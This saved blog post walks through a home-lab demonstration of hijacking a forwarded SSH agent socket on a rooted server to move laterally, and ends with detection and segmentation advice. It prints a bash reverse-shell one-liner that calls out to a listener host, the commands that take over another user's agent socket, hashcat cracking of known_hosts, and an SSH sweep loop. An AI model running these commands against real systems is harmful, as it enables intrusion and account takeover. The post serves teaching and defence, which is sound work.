---
link: https://grahamhelton.com/blog/ssh-agent
site: Graham Helton
excerpt: |-
  A walkthrough of compromising
  private keys in SSH-Agent for post-exploitation lateral movement
  shenanigans.
twitter: https://twitter.com/@grahamhelton3
slurped: 2025-12-17T09:21
title: |-
  Zero Effort Private Key Compromise:
  Abusing SSH-Agent For Lateral Movement
tags:
  - ssh
---

## Intro

The other day I was looking through some videos I had bookmarked and decided to throw on [AASLR: Leveraging SSH Keys for Lateral Movement](https://www.youtube.com/watch?v=Gr3ULSoRg9U) by Hal Pomeranz. About halfway though the video I had to start over and open up my notes to begin documenting what I was learning because there was some really interesting material that I hadn’t seen before. Using that training as a jumping off point, I began looking into other uses of the ssh-agent utility and decided to mock up a demo in my home lab. This post is a walk through of what I learned going down that rabbithole. # What is SSH Agent? For starters, we need to understand a little about what is going on with the ssh-agent process. ssh-agent is an interesting utility that is used to help ease the burden of managing private keys. It’s similar to the concept of single sign on but for SSH keys. The SSH agent allows you to add private keys/identities to the agent running on your local machine using `ssh-add <private_key_file>`. These keys can then be listed with `ssh-add -l`. After adding a key to the `ssh-agent` utility, you can then `ssh` to a server using the key without having to re-enter the password. This is useful for both humans and service accounts. Interestingly, you can also forward your key agent to the machine you’re connecting to, allowing you to use your private keys from the machine you’re connected to. Take this example:

1. _Admin_ is a server administrator who is responsible for maintaining many different Linux servers. _Admin_ utilizes SSH to remote into many machines for doing… whatever it is admins do.
2. _Admin_ Utilizes the `ssh-agent` utility to help ease the burden of connecting to dozens of servers with different keys (all of which are protected by unique passwords). This is done with the `ssh-add <privatekey>` command. (Note: you must correctly type the password when initially adding it to the `ssh-agent` key ring.) ![](https://grahamhelton.com/assets/images/Pasted-image-20230816005938.png)
3. Now, if _admin_ needs to connect to say, a dns server(_pihole_), instead of typing out `ssh -i /path/to/key/file [[email protected]](https://grahamhelton.com/cdn-cgi/l/email-protection)` then entering the (hopefully unique) password to the key file, she can simply type `ssh root@pihole` and the connection will be established.

This in and of itself isn’t _great_ from a security perspective as someone who was able to compromise _admin_’s machine would be able to ssh without having to know the password for the private key. Although I’d rather _not_ see this, it is forgivable. After all, making the lives of your admins complicated is the best way for admins to bypass your security measures all together. Where this gets really dicey is when the `ssh` option is used in conjunction with the `-A` option. In fact, even the `ssh` manpage gives a hint that it can lead to “the ability to bypass file permissions on the remote host”. Enticing.

![](https://grahamhelton.com/assets/images/Pasted-image-20230816010905.png)

To demonstrate why this could be _really_ bad, lets assume that _admin_ IS infact connecting to a server with the `ssh -A root@<server>` command. But first, why would anyone do this in the first place. Can’t we just make a policy to disallow our admins from using agent forwarding? Well, there are a few possible scenarios where this could be useful. 1. **Jumphosts**: In enterprise environments, accessing sensitive servers from your personal machine is not a great security policy. Instead, Jumphosts should be used. These special servers are (ideally) the only servers able to connect to sensitive machines via ssh. This segmentation can be implemented through firewalls. IE: `ssh root@super_important_dns_server` would not be possible from your local machine UNLESS your traffic is being proxied through a jumpserver. 2. You’re connected to a dev server that needs special access to something (IE: a git repository), but you don’t want to put your private key on the dev server.

These are two very simple scenarios, but you get the idea.

  
TLDR SSH Agent forwarding keeps your private keys out of places you don’t have control over.

Now, assume we are _admin_ and we need to make changes to a DNS server by logging into it via SSH. We would like to do so without having to store our SSH private key on the jumphost because it is shared between other people. One option for doing so is to use agent forwarding via `ssh -A root@jumphost`. Now, since our local machine has the private key for `[[email protected]](https://grahamhelton.com/cdn-cgi/l/email-protection)` in the ssh-agent, we can simply run `ssh [[email protected]](https://grahamhelton.com/cdn-cgi/l/email-protection)` from the jumphost machine and access `pi.hole` without any other security measures. What could possibly go wrong? Well, if an attacker is looking to pivot throughout the network, hijacking _admin_’s keys would be a great way to do so. In this post we will assume _admin_ connects to a server that is compromised by an attacker who has gained root privileges using `ssh -A root@<compromised_server>`.

To make this a little more clear, lets walk through the full attack chain in a lab environment.

## Demo

Lets first understand the environment in which we are in.

![](https://grahamhelton.com/assets/images/Pasted-image-20230818222627.png)

## Walkthrough

First things first lets establish our footing in the vulnerable server. In a real scenario, this would be up to you (or your initial access team) to get onto a Linux server and compromise the root account. In this demo I will be attacking from `root@attacker-server` and spawning a reverse shell using a simple bash reverse shell. `bash -i >& /dev/tcp/192.168.1.184/1337 0>&1` and a netcat listener `netcat -nvlp 1337`. That should establish our very rudimentary access to the compromised server `vuln-server`.

After we get access to the machine, I used python to spawn a fully interactive TTY with `python -c 'import pty; pty.spawn("/bin/bash")'`. This isn’t strictly necessary most of the time, but it can make things a bit easier when working with login prompts so it’s a good habit to get into assuming you’re in a lab environment :)

Next, running the `ssh-add -l` command on `vuln-server` allows us to identify if there are any loaded identities. Currently, there are no identities loaded which means no one is logged into this server as _root_ with an SSH session using ssh-agent. Fairly normal so far.

![](https://grahamhelton.com/assets/images/Pasted-image-20230815220110.png)

Now for the interesting part. When we run `lsof -U | grep agent`, we get a result back indicating that the user _admin_ is logged in to the machine and is utilizing SSH-Agent. Once again, it’s important to note that we can only see this because we already have _root_ on the system (or some other highly privileged user).

![](https://grahamhelton.com/assets/images/Pasted-image-20230815220941.png)

With this information in mind, lets attempt to take over the `SSH_AUTH_SOCK` socket. Doing so is is fairly trivial. All we need to do is set an environment variable of the root user using the `export` command. To do so, simply take the `/tmp/ssh-ZzrtT2ZwVr/agent.4145` path identified in the previous `lsof -U | grep agent` command, and assign it to the `SSH_AUTH_SOCK` environment variable by running `export SSH_AUTH_SOCK=/tmp/ssh-ZzrtT2ZwVr/agent4145`.

![](https://grahamhelton.com/assets/images/Pasted-image-20230815221235.png)

Now that we have pointed the environment variable to an existing SSH socket, we have essentially compromised the SSH session for the admin user. Running the command `ssh-add -l` once again, we can see the fingerprint for the keys on the _admin_ user’s LOCAL machine. I ran `ssh-add -l` on my local machine (which is where I am logged in as admin from) and you can see that the fingerprints are the same because I have logged into the compromised machine using agent forwarding.

![](https://grahamhelton.com/assets/images/Pasted-image-20230815221106.png)

Since we now have access to the admin user’s `ssh-agent` keys, we can utilize those to connect to other hosts the admin has connected to previously. (Un)fortunately, this is not a full compromise of the private key as the SSH-Agent does not allow you to export the actual private key in any way. Instead, the verification to the server uses a challenge/response to verify key-authenticity.

What this does allow us to do is almost better than a full key compromise because it will bypass the need to know the password of the private keys and connect to computers previously connected to by the _admin_ user.

So how do find out what our compromised admin account has been accessing? There are a few ways we can do so. The first is by checking the `/home/admin/known_hosts` file. This file typically contains the IP addresses of previously connected to hosts. However, taking a look at our file (on an Ubuntu 20.04) system, you might notice that there are not any IP addresses… What gives?

![](https://grahamhelton.com/assets/images/Pasted-image-20230816002916.png)

Well, you can thank the `/etc/ssh/ssh_config` file’s `HashKnownHosts` option for this. If this option is set, the hosts that _admin_ has been connecting to will be… well hashed.

![](https://grahamhelton.com/assets/images/Pasted-image-20230815233208.png)

## Route 1: Cracking Hashes

One of the options we have for overcoming this `HashKnownHosts` option is simply to… crack them using a tool like hashcat. Fortunately someone has taken the time to write a great tool in python to automatically convert a `known_hosts` file in to a format hashcat can parse. Enter the aptly named [Known_Hosts-Hashcat](https://github.com/chris408/known_hosts-hashcat) tool. Thanks [chris408](https://github.com/chris408)!

![](https://grahamhelton.com/assets/images/Pasted-image-20230818223905.png)

After converting our known_hosts file to a more crackable format (and switching to a machine that hashcat plays nicely on), we can crack the hashes with the following hashcat command: `hashcat.bin -m 160 --hex-salt ../converted_known_hosts -a 3 ipv4_hcmask.txt --quiet`. Just like that, we can see that _admin_ has SSH’d to the IPs `192.168.1.3` and `192.168.1.2`. We can now try to authenticate to each of these machines to identify if we can move laterally across the network to them.

![](https://grahamhelton.com/assets/images/Pasted-image-20230818223346.png)

## Route 2: Checking the history file

Another easy way to identify where you might have access to is by checking the `/home/admin/.bash_history` file. Since we’re root on this machine, we will have no problem viewing this file.

![](https://grahamhelton.com/assets/images/Pasted-image-20230816002757.png)

There are a few disadvantages of doing it those way.

1. The bash history file could have been cleared for some reason (unlikely)
2. The user has not logged out of the machine yet, so the history file might not even be written to yet.
3. The bash history limit could be set to a low number and the data is no longer available.

## Route 3: CHECK ALL THE THINGS

Another odd way you can attempt to enumerate which machines you have access to is by running this funky bash script that attempts to ssh into every domain in a `192.168.1.0/24` and run a few commands. If you see output from a given IP address, it means you’re able to access that machine. While I don’t recommend doing this, technically it’s possible if you’re not trying to be stealthy. It’s not pretty but it’ll get the job done.

```
for i in 192.168.1.{1..255}; do echo "Checking $i for access..." ; ssh -o BatchMode=yes root@$i "hostname; whoami; ip -c a | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'" 2>/dev/null; done
```

![](https://grahamhelton.com/assets/images/Pasted-image-20230815222305.png)

## Stealing the SSH session

Assuming you were able to find some evidence of where the _admin_ has been connecting to, masquerading as the user by using their `ssh-agent` identities is trivial. After setting your `SSH_AUTH_SOCK` environment variable correctly, simply ssh into the server identified. IE: `ssh [[email protected]](https://grahamhelton.com/cdn-cgi/l/email-protection)`. Even if the ssh key generally used to access this server is password protected, you will be logged into the remote server without being prompted to enter the private key password. In this case, I was able to authenticate to the DNS server.

![](https://grahamhelton.com/assets/images/Pasted-image-20230816002825.png)

## Detections

As with most attacks, understanding your network baseline and segmenting your network is your best bet at detecting this kind of compromise. Due the the fact that this isn’t some fancy exploit, you’ll have a hard time detecting it if you don’t know what to look for. My recommendations are as follows: 1. Segment your network. In this example everything was on a flat network, making it trivial to pivot. 2. Understand your network baseline. In a real scenario, it should be very suspicious that your webserver in a DMZ is SSHing to ANYTHING.

Abusing this SSH configuration can be trivial. By implementing firewall rules to further segment your network, this attack can be mitigated. A quick example is by dropping all packets from the `vuln-server` host on the `DNS` server using IP tables. `iptables -I INPUT -s 192.168.1.183 -j DROP` . A bit contrived in this example, but fine grain access control is something every network should be implementing. ![](https://grahamhelton.com/assets/images/Pasted-image-20230816094035.png) # Wrapping up So, is this a vulnerability? Well no, not exactly. Like most things in the security world, this “attack” is really just abusing intended functionality. The goal of this post (aside from acting as my own reference for if I stumble upon this in the future), is to walk you through what can theoretically be done under the correct circumstances. If you have any questions, feel free to let me [know on any of these sites](https://grahamhelton.com/pages/links/) or shoot me an email via `blog[AT]grahamhelton.com`. Until next time.

## References

- https://www.youtube.com/watch?v=Gr3ULSoRg9U&t
- https://www.ssh.com/academy/ssh/agent
- https://smallstep.com/blog/ssh-agent-explained/
- https://www.linode.com/docs/guides/using-ssh-agent/
- https://en.wikipedia.org/wiki/Ssh-agent